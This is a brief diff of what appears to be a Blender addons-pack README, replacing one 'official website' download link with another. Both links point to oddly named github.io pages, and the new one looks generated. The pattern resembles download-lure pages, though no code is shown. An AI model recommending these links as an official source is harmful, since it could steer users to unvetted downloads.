@@ -51,6 +51,6 @@ A: We update the pack periodically to include new addons and improvements. Major
 
 Ready to enhance your Blender workflow? Download the addons pack now:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 By downloading, you agree to our terms of use. For support, join our community Discord or visit the GitHub issues page.
